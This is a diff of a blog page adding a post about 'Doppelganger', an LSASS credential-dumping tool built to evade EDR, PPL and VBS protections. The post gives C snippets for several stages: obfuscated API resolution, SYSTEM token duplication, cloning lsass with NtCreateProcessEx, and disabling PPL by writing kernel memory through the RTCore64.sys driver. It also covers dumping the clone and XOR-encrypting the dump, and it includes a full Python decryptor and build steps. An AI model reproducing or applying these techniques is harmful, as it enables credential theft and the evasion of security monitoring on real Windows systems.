@@ -12,7 +12,7 @@
 
 <title>Doppelganger - Vari-sh&rsquo;s Blog</title>
 
-<meta name="description" content="">
+<meta name="description" content="## Doppelganger Program: An Advanced LSASS Dumper with Process Cloning ### Author: vari.sh # Overview The Doppelganger Program is an advanced Windows utility designed to obtain an LSASS (Local Security Authority Subsystem Service) dump from a cloned process, rather than the original one. By using process cloning techniques, the tool aims to bypass PPL (Process Protected Light), VBS (Virtualization Based Security), EDR/XDR detection mechanisms that typically monitor interactions with lsass.">
 
 
 
@@ -326,7 +326,7 @@
     <article class="post h-entry">
         <div class="post-header">
             <header>
-                <h1 class="p-name post-title draft">Doppelganger</h1>
+                <h1 class="p-name post-title">Doppelganger</h1>
                 
 
             </header>
@@ -364,6 +364,39 @@
 
   
   
+  
+  <details class="toc noselect">
+    <summary>Table of Contents</summary>
+    <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#doppelganger-program-an-advanced-lsass-dumper-with-process-cloning">Doppelganger Program: An Advanced LSASS Dumper with Process Cloning</a></li>
+      </ul>
+    </li>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#features">Features</a></li>
+    <li><a href="#installation">Installation</a>
+      <ul>
+        <li><a href="#compilation">Compilation</a></li>
+      </ul>
+    </li>
+    <li><a href="#code-breakdown">Code Breakdown</a>
+      <ul>
+        <li><a href="#1-resolving-apis">1. Resolving APIs</a></li>
+        <li><a href="#2-token-duplication">2. Token Duplication</a></li>
+        <li><a href="#3-process-cloning">3. Process Cloning</a></li>
+        <li><a href="#4-disabling-ppl">4. Disabling PPL</a></li>
+        <li><a href="#5-creating-the-dump">5. Creating the Dump</a></li>
+      </ul>
+    </li>
+    <li><a href="#decryption">Decryption</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#disclaimer">Disclaimer</a></li>
+  </ul>
+</nav></div>
+  </details>
+  
 
 
 
@@ -386,7 +419,237 @@
 </script>
 
         <div class="content e-content">
-            
+            <h3 id="doppelganger-program-an-advanced-lsass-dumper-with-process-cloning" >
+<div>
+    <a href="#doppelganger-program-an-advanced-lsass-dumper-with-process-cloning">
+        ##
+    </a>
+    Doppelganger Program: An Advanced LSASS Dumper with Process Cloning
+</div>
+</h3>
+<h4 id="author-varish" >
+<div>
+    <a href="#author-varish">
+        ###
+    </a>
+    Author: vari.sh
+</div>
+</h4>
+<hr>
+<p><img src="/images/doppelganger.png" alt="Doppelganger"></p>
+<h2 id="overview" >
+<div>
+    <a href="#overview">
+        #
+    </a>
+    Overview
+</div>
+</h2>
+<p>The <strong>Doppelganger Program</strong> is an advanced Windows utility designed to obtain an LSASS (Local Security Authority Subsystem Service) dump from a cloned process, rather than the original one. By using process cloning techniques, the tool aims to bypass PPL (Process Protected Light), VBS (Virtualization Based Security), EDR/XDR detection mechanisms that typically monitor interactions with <code>lsass.exe</code>.</p>
+<p>The program achieves this by:</p>
+<ul>
+<li>Obtaining a SYSTEM token through token duplication.</li>
+<li>Loading clean versions of Windows DLLs to avoid detection.</li>
+<li>Cloning the LSASS process using <code>NtCreateProcessEx</code>.</li>
+<li>Disabling PPL (Protected Process Light) protection on <code>lsass.exe</code>.</li>
+<li>Creating an LSASS dump using <code>MiniDumpWriteDump()</code>.</li>
+<li>Encrypting the dump file using XOR encryption to further avoid detection.</li>
+</ul>
+<hr>
+<h2 id="features" >
+<div>
+    <a href="#features">
+        #
+    </a>
+    Features
+</div>
+</h2>
+<ul>
+<li><strong>Process Cloning:</strong> Uses <code>NtCreateProcessEx</code> to clone <code>lsass.exe</code> and avoid detection.</li>
+<li><strong>XOR Encryption:</strong> Dumps are encrypted with a predefined XOR key before being written to disk.</li>
+<li><strong>Driver Interaction:</strong> Leverages <code>RTCore64.sys</code> for direct memory access to disable PPL.</li>
+<li><strong>Token Manipulation:</strong> Elevates to SYSTEM privileges to access LSASS.</li>
+<li><strong>DLL Offuscation:</strong> Loads DLLs using encrypted strings to bypass signature-based detections.</li>
+</ul>
+<hr>
+<h2 id="installation" >
+<div>
+    <a href="#installation">
+        #
+    </a>
+    Installation
+</div>
+</h2>
+<p>The Doppelganger Program is written in C and is intended to be compiled using Visual Studio. The repository is structured as follows:</p>
+<pre tabindex="0"><code>doppelganger/
+│
+├── includes/          # Header files (.h)
+├── src/               # Source files (.c)
+├── build/             # Output binaries
+├── utils/             # Utility scripts (e.g., decryptor)
+└── README.md          # Documentation
+</code></pre><h3 id="compilation" >
+<div>
+    <a href="#compilation">
+        ##
+    </a>
+    Compilation
+</div>
+</h3>
+<p>Compile the project in Visual Studio using the provided solution file.
+Ensure to have the <code>RTCore64.sys</code> driver present and accessible by the program.</p>
+<hr>
+<h2 id="code-breakdown" >
+<div>
+    <a href="#code-breakdown">
+        #
+    </a>
+    Code Breakdown
+</div>
+</h2>
+<h3 id="1-resolving-apis" >
+<div>
+    <a href="#1-resolving-apis">
+        ##
+    </a>
+    1. Resolving APIs
+</div>
+</h3>
+<p>The tool resolves critical Windows APIs by decrypting their names from encrypted strings and dynamically loading them with <code>CustomGetProcAddress()</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#78787e">// Example of resolving API pointers
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span>BOOL success <span style="color:#ff6ac1">=</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#57c7ff">ResolveApiFromDll</span>(hKernel32, P32F_ENC, <span style="color:#ff6ac1">sizeof</span>(P32F_ENC), (<span style="color:#9aedfe">void</span><span style="color:#ff6ac1">**</span>)<span style="color:#ff6ac1">&amp;</span>pP32F) <span style="color:#ff6ac1">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#57c7ff">ResolveApiFromDll</span>(hNtdll, NTCPE_ENC, <span style="color:#ff6ac1">sizeof</span>(NTCPE_ENC), (<span style="color:#9aedfe">void</span><span style="color:#ff6ac1">**</span>)<span style="color:#ff6ac1">&amp;</span>pNTCPX) <span style="color:#ff6ac1">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#57c7ff">ResolveApiFromDll</span>(hAdvapi32, OPTK_ENC, <span style="color:#ff6ac1">sizeof</span>(OPTK_ENC), (<span style="color:#9aedfe">void</span><span style="color:#ff6ac1">**</span>)<span style="color:#ff6ac1">&amp;</span>pOPTK);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> (<span style="color:#ff6ac1">!</span>success) {
+</span></span><span style="display:flex;"><span>    <span style="color:#57c7ff">log_error</span>(<span style="color:#5af78e">&#34;Failed to resolve one or more APIs.&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> FALSE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="2-token-duplication" >
+<div>
+    <a href="#2-token-duplication">
+        ##
+    </a>
+    2. Token Duplication
+</div>
+</h3>
+<p>To interact with <code>lsass.exe</code>, the tool impersonates SYSTEM using duplicated tokens.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HANDLE hSystemToken <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">NULL</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> (<span style="color:#ff6ac1">!</span><span style="color:#57c7ff">GetSystemTokenAndDuplicate</span>(<span style="color:#ff6ac1">&amp;</span>hSystemToken)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#57c7ff">log_error</span>(<span style="color:#5af78e">&#34;Failed to duplicate SYSTEM token.&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#ff9f43">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="3-process-cloning" >
+<div>
+    <a href="#3-process-cloning">
+        ##
+    </a>
+    3. Process Cloning
+</div>
+</h3>
+<p>Using <code>NtCreateProcessEx</code>, the tool creates a clone of <code>lsass.exe</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>NTSTATUS status <span style="color:#ff6ac1">=</span> <span style="color:#57c7ff">pNTCPX</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">&amp;</span>hClone,
+</span></span><span style="display:flex;"><span>    PROCESS_ALL_ACCESS,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">&amp;</span>objAttr,
+</span></span><span style="display:flex;"><span>    hLsass,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff9f43">0</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">NULL</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">NULL</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">NULL</span>,
+</span></span><span style="display:flex;"><span>    FALSE
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><h3 id="4-disabling-ppl" >
+<div>
+    <a href="#4-disabling-ppl">
+        ##
+    </a>
+    4. Disabling PPL
+</div>
+</h3>
+<p>Protected Process Light (PPL) protection is disabled by directly modifying memory using the <code>RTCore64.sys</code> driver.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#57c7ff">WriteMemoryPrimitive</span>(Device, <span style="color:#ff9f43">1</span>, eproc <span style="color:#ff6ac1">+</span> offs.Protection <span style="color:#ff6ac1">-</span> <span style="color:#ff9f43">2</span>, <span style="color:#ff9f43">0x00</span>); <span style="color:#78787e">// SignatureLevel
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span><span style="color:#57c7ff">WriteMemoryPrimitive</span>(Device, <span style="color:#ff9f43">1</span>, eproc <span style="color:#ff6ac1">+</span> offs.Protection <span style="color:#ff6ac1">-</span> <span style="color:#ff9f43">1</span>, <span style="color:#ff9f43">0x00</span>); <span style="color:#78787e">// SectionSignatureLevel
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span><span style="color:#57c7ff">WriteMemoryPrimitive</span>(Device, <span style="color:#ff9f43">1</span>, eproc <span style="color:#ff6ac1">+</span> offs.Protection, <span style="color:#ff9f43">0x00</span>); <span style="color:#78787e">// Protection
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span><span style="color:#57c7ff">log_success</span>(<span style="color:#5af78e">&#34;PPL disabled (0x00 written)&#34;</span>);
+</span></span></code></pre></div><p>After the cloning, the values will be restored.</p>
+<h3 id="5-creating-the-dump" >
+<div>
+    <a href="#5-creating-the-dump">
+        ##
+    </a>
+    5. Creating the Dump
+</div>
+</h3>
+<p>Finally, a memory dump of the cloned <code>lsass.exe</code> process is created and encrypted.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL dumped <span style="color:#ff6ac1">=</span> <span style="color:#57c7ff">pMDWD</span>(
+</span></span><span style="display:flex;"><span>    hClone,
+</span></span><span style="display:flex;"><span>    clonedPID,
+</span></span><span style="display:flex;"><span>    hTempFile,
+</span></span><span style="display:flex;"><span>    MiniDumpWithFullMemory,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">NULL</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">NULL</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">NULL</span>
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><hr>
+<h2 id="decryption" >
+<div>
+    <a href="#decryption">
+        #
+    </a>
+    Decryption
+</div>
+</h2>
+<p>A simple Python script is provided to decrypt the dumped files.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>XOR_KEY <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;0123456789abcdefghij&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">xor_decrypt</span>(data: <span style="color:#ff5c57">bytes</span>, key: <span style="color:#ff5c57">bytes</span>) <span style="color:#ff6ac1">-&gt;</span> <span style="color:#ff5c57">bytes</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#ff5c57">bytes</span>([b <span style="color:#ff6ac1">^</span> key[i <span style="color:#ff6ac1">%</span> <span style="color:#ff5c57">len</span>(key)] <span style="color:#ff6ac1">for</span> i, b <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">enumerate</span>(data)])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> <span style="color:#ff5c57">len</span>(sys<span style="color:#ff6ac1">.</span>argv) <span style="color:#ff6ac1">!=</span> <span style="color:#ff9f43">2</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;Usage: </span><span style="color:#5af78e">{</span>sys<span style="color:#ff6ac1">.</span>argv[<span style="color:#ff9f43">0</span>]<span style="color:#5af78e">}</span><span style="color:#5af78e"> &lt;xor_dump_path&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#ff6ac1">.</span>exit(<span style="color:#ff9f43">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    encrypted_path <span style="color:#ff6ac1">=</span> sys<span style="color:#ff6ac1">.</span>argv[<span style="color:#ff9f43">1</span>]
+</span></span><span style="display:flex;"><span>    output_path <span style="color:#ff6ac1">=</span> encrypted_path <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">&#34;.dec&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">with</span> <span style="color:#ff5c57">open</span>(encrypted_path, <span style="color:#5af78e">&#34;rb&#34;</span>) <span style="color:#ff6ac1">as</span> f:
+</span></span><span style="display:flex;"><span>        data <span style="color:#ff6ac1">=</span> f<span style="color:#ff6ac1">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    decrypted <span style="color:#ff6ac1">=</span> xor_decrypt(data, XOR_KEY)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">with</span> <span style="color:#ff5c57">open</span>(output_path, <span style="color:#5af78e">&#34;wb&#34;</span>) <span style="color:#ff6ac1">as</span> f:
+</span></span><span style="display:flex;"><span>        f<span style="color:#ff6ac1">.</span>write(decrypted)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;Decryption successful. Output written to: </span><span style="color:#5af78e">{</span>output_path<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> __name__ <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><hr>
+<h2 id="conclusion" >
+<div>
+    <a href="#conclusion">
+        #
+    </a>
+    Conclusion
+</div>
+</h2>
+<p>The Doppelganger Program demonstrates how process cloning, API obfuscation, and memory manipulation can be used to bypass traditional detection mechanisms. The combination of techniques makes it effective at retrieving sensitive memory data even on systems protected by anti-tampering mechanisms.</p>
+<hr>
+<h2 id="disclaimer" >
+<div>
+    <a href="#disclaimer">
+        #
+    </a>
+    Disclaimer
+</div>
+</h2>
+<p>This project is for educational purposes only. Use responsibly and only in environments where you have explicit permission to test security mechanisms.</p>
+
         </div>
 
     </article>
